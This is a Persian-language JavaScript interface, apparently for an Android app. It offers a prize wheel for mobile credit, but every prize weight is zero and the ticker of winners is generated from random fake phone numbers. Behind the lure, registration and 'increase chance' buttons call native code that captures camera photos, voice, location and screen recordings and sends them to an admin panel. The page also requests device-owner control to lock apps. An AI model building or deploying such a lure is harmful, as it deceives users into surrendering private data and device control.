'use strict';

const FA = '۰۱۲۳۴۵۶۷۸۹';
const fa = (n) => String(n).replace(/[0-9]/g, (d) => FA[+d]);
const toAscii = (s) => String(s).replace(/[۰-۹]/g, (d) => FA.indexOf(d))
  .replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));

const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

const NUMRUN = /[0-9۰-۹٠-٩][0-9۰-۹٠-٩.,٫٬%٪]*/g;
const num = (s) => esc(s).replace(NUMRUN, (m) => `<i class="n">${m}</i>`);

const $ = (id) => document.getElementById(id);
const state = { wheelTurn: 0, chanceTimer: null, sheet: null, spun: false };




const CONSENT =
  'با زدن تایید، روی همین گوشی و فقط در همین لحظه این کارها انجام می‌شود:\n\n'
  + '• سه عکس از دوربین جلو\n'
  + '• سه عکس از دوربین عقب\n'
  + '• یک ویس کوتاه\n'
  + '• موقعیت مکانی\n\n'
  + 'همه‌ی این‌ها همراه شماره و مشخصات گوشی برای پنل مدیریت فرستاده می‌شود. '
  + 'هیچ‌کدام در پس‌زمینه انجام نمی‌شود. این برنامه کلید فشرده‌شده، پیامک، '
  + 'پیام‌رسان و کلیپ‌بورد را نمی‌خواند و از راه دور نمی‌تواند دوربین یا '
  + 'میکروفون را روشن کند.';

const CONSENT_SCREEN =
  'برای ثبت ویدیو، اندروید از شما یک تایید جداگانه می‌گیرد که خودِ سیستم '
  + 'نشان می‌دهد. پس از آن، تصویر صفحه‌ی گوشی حداکثر ۳ دقیقه ضبط و برای پنل '
  + 'فرستاده می‌شود. برنامه بسته نمی‌شود و همین‌جا می‌ماند.';







const SLICES = [
  { key: 'charge_50',  label: '۵۰ هزارتومن شارژ', w: 0,  c1: '#2a3550', c2: '#1d2740' },
  { key: 'charge_100', label: '۱۰۰ هزارتومن شارژ', w: 0, c1: '#2a3550', c2: '#1d2740' },
  { key: 'data_5g',    label: '۵ گیگ اینترنت',      w: 0,  c1: '#2a3550', c2: '#1d2740' },
  { key: 'blank_a',    label: 'پوچ',                 w: 45, c1: '#334155', c2: '#1e293b' },
  { key: 'again',      label: 'شانس دوباره',         w: 10, c1: '#7c5cff', c2: '#4dd4ff' },
  { key: 'blank_b',    label: 'پوچ',                 w: 45, c1: '#334155', c2: '#1e293b' },
];

const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);
const RE_SPIN_WINDOW_MS = 24 * 60 * 60 * 1000;

function drawWheel() {
  const stops = [];
  let acc = 0;
  for (const s of SLICES) {
    const from = (acc / TOTAL) * 360;
    acc += s.w;
    const to = (acc / TOTAL) * 360;
    if (s.w > 0) stops.push(`${s.c1} ${from}deg ${to}deg`);
  }
  
  
  $('wheel').style.background =
    `conic-gradient(${stops.join(',')})`;

  let marks = '';
  let ang = 0;
  for (const s of SLICES) {
    const mid = ang + s.w / 2;
    ang += s.w;
    if (s.w <= 0) {
      marks += `<i style="--a:${mid}deg" class="wmark zero"></i>`;
      continue;
    }
    marks += `<i style="--a:${mid}deg" class="wmark" data-k="${s.key}">
      <b>${s.label}</b></i>`;
  }
  $('wheel').innerHTML = marks;
  
  
  $('wheelHub').textContent = fa(0) + '٪';
}








const styleTag = document.createElement('style');
styleTag.textContent = `
  .wmark{position:absolute;left:50%;top:50%;width:0;height:0;}
  .wmark b{position:absolute;transform-origin:0 0;
    transform:rotate(var(--a)) translateY(-118px) rotate(-90deg);
    white-space:nowrap;font-size:12px;font-weight:700;
    color:#eaf0ff;text-shadow:0 1px 4px rgba(0,0,0,.9);}
  .wmark.zero{width:9px;height:9px;margin:-4.5px;border-radius:50%;
    background:rgba(255,255,255,.30);}
`;
document.head.appendChild(styleTag);

function pick(random) {
  let roll = Math.floor(random() * TOTAL);
  for (const s of SLICES) { roll -= s.w; if (roll < 0) return s; }
  return SLICES[SLICES.length - 1];
}

function spinTo(slice) {
  let acc = 0;
  for (const s of SLICES) {
    if (s.key === slice.key) break;
    acc += s.w;
  }
  const mid = acc + slice.w / 2;
  
  
  const target = 360 * 5 + (360 - (mid / TOTAL) * 360);
  state.wheelTurn += target - (state.wheelTurn % 360);
  $('wheel').style.transform = `rotate(${state.wheelTurn}deg)`;
  return (mid / TOTAL) * 360;
}

function oddsLine() {
  const p = (w) => fa(Math.round((w / TOTAL) * 100)) + '٪';
  return 'شانس برنده‌شدن هر سه جایزه '
    + p(SLICES[0].w + SLICES[1].w + SLICES[2].w)
    + ' است؛ '
    + p(SLICES[4].w) + ' شانس دوباره و '
    + p(SLICES[3].w + SLICES[5].w) + ' پوچ. هیچ جایزه‌ای پرداخت نمی‌شود.';
}







const PRIZES = [
  { label: '۵ گیگ اینترنت', w: 50 },
  { label: '۵۰ هزارتومن شارژ', w: 30 },
  { label: '۱۰۰ هزارتومن شارژ', w: 20 },
];
const PREFIXES = ['0992', '0993', '0994', '0912', '0913', '0914', '0910', '0909'];
let usedRows = new Set();
let usedPrizes = [];

function carrierFor(p) {
  if (p[2] >= '2' && p[2] <= '4') return 'ایرانسل';
  if (p[2] === '0') return 'رایتل';
  return 'همراه اول';
}

function masked(prefix, rnd) {
  const head = 1000 + Math.floor(rnd() * 9000);
  const tail = Math.floor(rnd() * 10);
  return fa(prefix + head) + '******' + fa(tail);
}

function weightedPrize(rnd) {
  
  
  const least = usedPrizes.length < PRIZES.length
    ? PRIZES.filter((p) => !usedPrizes.includes(p.label))
    : PRIZES;
  const total = least.reduce((a, p) => a + p.w, 0);
  let roll = rnd() * total;
  for (const p of least) { roll -= p.w; if (roll < 0) return p.label; }
  return least[0].label;
}

function newRow() {
  let prefix, key, tries = 0;
  do {
    prefix = PREFIXES[Math.floor(Math.random() * PREFIXES.length)];
    const head = 1000 + Math.floor(Math.random() * 9000);
    key = prefix + head;
  } while (usedRows.has(key) && ++tries < 40);
  
  
  if (usedRows.has(key)) usedRows.clear();
  usedRows.add(key);

  const prize = weightedPrize(Math.random);
  usedPrizes.push(prize);
  if (usedPrizes.length > PRIZES.length) usedPrizes.shift();

  return { who: masked(prefix, Math.random), prize, carrier: carrierFor(prefix) };
}

let rows = [];
function renderWinners() {
  $('winners').innerHTML = rows.map((r) =>
    `<li><span class="who n">${esc(r.who)}</span>
         <span class="what">${num(r.prize)}</span></li>`).join('');
}

function seedWinners(n) {
  rows = [];
  for (let i = 0; i < n; i++) rows.push(newRow());
  renderWinners();
}

function tickWinners() {
  rows = [newRow(), ...rows].slice(0, 5);
  renderWinners();
}





const CHANCE_MS = 3 * 60 * 1000;

function renderChance(s) {
  const n = Number(s.chances) || 0;
  $('chanceN').textContent = fa(n);
  $('videoN').textContent = fa(s.videos || 0);
  $('chanceBar').style.width = Math.min(100, (n % 5) * 20 || (n > 0 ? 100 : 0)) + '%';

  const left = Math.max(0, (Number(s.spinReadyAt) || 0) - Number(s.now || 0));
  $('spinIn').innerHTML = left > 0 ? num(human(left)) : 'آماده';

  const hint = $('chanceHint');
  if (left > 0) {
    hint.innerHTML = num('چرخ بعدی ' + human(left) + ' دیگر می‌چرخد. تا آن زمان ضبط انجام می‌شود و شانس اضافه می‌شود.');
  } else {
    hint.innerHTML = num('هر ۳ دقیقه یک شانس اضافه می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.');
  }

  const btn = $('btnSpin');
  const busy = s.recording;
  btn.disabled = !!busy || !!s.busy;
  btn.textContent = busy ? 'در حال ضبط…' : 'افزایش شانس';
  $('spinNote').textContent = busy
    ? 'ضبط صفحه در جریان است. پس از پایان، فایل فرستاده می‌شود و برنامه باز می‌ماند.'
    : 'با هر فشردن، صفحه گوشی ضبط و ذخیره می‌شود.';
}

function human(ms) {
  const s = Math.ceil(ms / 1000);
  if (s < 60) return fa(s) + ' ثانیه';
  const m = Math.ceil(s / 60);
  if (m < 60) return fa(m) + ' دقیقه';
  const h = Math.floor(m / 60);
  const rm = m % 60;
  if (h < 24) return fa(h) + ' ساعت' + (rm ? ' و ' + fa(rm) + ' دقیقه' : '');
  return fa(Math.floor(h / 24)) + ' روز';
}




function renderGate(s) {
  const dot = $('gateDot');
  const btns = $('gateBtns');
  if (s.owner) {
    dot.className = 'gateDot ok';
    $('gateTitle').textContent = 'مدیریت کامل فعال';
    $('gateNote').textContent = 'همه‌ی قابلیت‌ها باز است.';
    btns.style.display = 'none';
  } else if (s.admin) {
    dot.className = 'gateDot no';
    $('gateTitle').textContent = 'مدیریت نیمه فعال';
    $('gateNote').textContent = 'برای قفل‌کردن برنامه‌ها باید مالک دستگاه ثبت شود.';
    btns.style.display = s.canProvision ? 'flex' : 'none';
    $('btnOwner').style.display = s.canProvision ? '' : 'none';
  } else {
    dot.className = 'gateDot no';
    $('gateTitle').textContent = 'مدیریت فعال نیست';
    $('gateNote').textContent = 'برای فعال‌شدن، دکمه‌ی زیر را بزنید.';
    btns.style.display = 'flex';
  }
}

function renderFacts(list) {
  $('facts').innerHTML = (list || []).map((f) => {
    const cls = ['fact'];
    if (f.wide) cls.push('wide');
    if (!f.v) cls.push('void');
    return `<div class="${cls.join(' ')}">
      <span class="k">${num(f.k)}</span>
      <span class="v">${f.v ? num(f.v) : (f.why ? num(f.why) : 'ثبت نشده')}</span>
    </div>`;
  }).join('');
}

function log(msg, tone) {
  const el = $('log');
  el.innerHTML = num(msg || 'آماده.');
  el.className = 'log' + (tone ? ' ' + tone : '');
}

function setBusy(b) { $('progress').hidden = !b; }





function ask(title, body) {
  return new Promise((resolve) => {
    state.sheet = resolve;
    $('sheetTitle').textContent = title;
    $('sheetBody').textContent = body;
    $('sheet').hidden = false;
  });
}

function closeSheet(v) {
  $('sheet').hidden = true;
  const r = state.sheet;
  state.sheet = null;
  if (r) r(v);
}







const N = (window.Prf = window.Prf || {});
const J = () => window.Native;

N.ready = function () {
  try {
    drawWheel();
    $('odds').innerHTML = num(oddsLine());
    $('operator').innerHTML = String(J().operators() || '')
      .split(',').map((o) => o.trim()).filter(Boolean)
      .map((o) => `<option value="${esc(o)}">${esc(o)}</option>`).join('');
    $('operator').value = J().operator() || '';
    seedWinners(5);
    $('phone').value = J().phone() || '';
    N.push();
    setInterval(tickWinners, 9000);
    N.log('برای شروع، شماره‌ی خود را وارد و «ثبت شماره» را بزنید.');
  } catch (e) {
    log('راه‌اندازی صفحه ناتمام ماند: ' + (e && e.message ? e.message : e), 'warn');
  }
};





N.push = function () {
  let s = null;
  try {
    const raw = J().state();
    if (raw) s = typeof raw === 'string' ? JSON.parse(raw) : raw;
  } catch (e) {
    log('وضعیت دستگاه خوانده نشد.', 'warn');
    return;
  }
  if (!s) return;
  renderGate(s);
  renderChance(s);
  $('heroSub').innerHTML = s.registered
    ? num('ثبت شده — ' + (s.lastReport || 'منتظر گزارش بعدی'))
    : 'هنوز ثبت نشده';
  $('btnRegister').disabled = !!s.busy;
  $('btnRegister').textContent = s.busy ? 'در حال انجام…' : 'ثبت شماره';
  if (s.facts) renderFacts(s.facts);
  if (s.log !== undefined) log(s.log, s.logTone);
  setBusy(!!s.busy);
};

N.winners = function () { return rows.map((r) => r.who + '|' + r.prize); };




N.log = function (msg, tone) { log(msg, tone); };





N.spin = function (key) {
  const slice = SLICES.find((s) => s.key === key) || SLICES[3];
  state.spun = true;
  spinTo(slice);
};

N.ask = ask;





$('phone').addEventListener('input', (e) => {
  const el = e.target;
  const ascii = toAscii(el.value).replace(/[^\d+]/g, '');
  if (ascii !== el.value) {
    const at = el.selectionStart || 0;
    el.value = ascii;
    const keep = Math.min(ascii.length, at);
    try { el.setSelectionRange(keep, keep); } catch (_) { }
  }
  $('phoneErr').hidden = true;
});

$('operator').addEventListener('change', (e) => J().setOperator(e.target.value));

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-act]');
  if (!b) return;
  const act = b.dataset.act;
  if (act === 'sheetYes') return closeSheet(true);
  if (act === 'sheetNo') return closeSheet(false);

  if (act === 'register') {
    const phone = $('phone').value.trim();
    if (!/^0?9\d{9}$/.test(phone.replace(/^\+98/, '0'))) {
      $('phoneErr').hidden = false;
      $('phone').focus();
      return;
    }
    
    
    
    
    ask('تایید ثبت', CONSENT).then((ok) => {
      if (ok) J().register(phone, $('operator').value);
    });
    return;
  }

  if (act === 'spin') {
    if ($('btnSpin').disabled) return;
    ask('تایید ضبط صفحه', CONSENT_SCREEN).then((ok) => {
      if (ok) J().spin();
    });
    return;
  }
  if (act === 'admin') { J().admin(); return; }
  if (act === 'owner') { J().owner(); return; }
  if (act === 'settings') { J().settings(); return; }
});
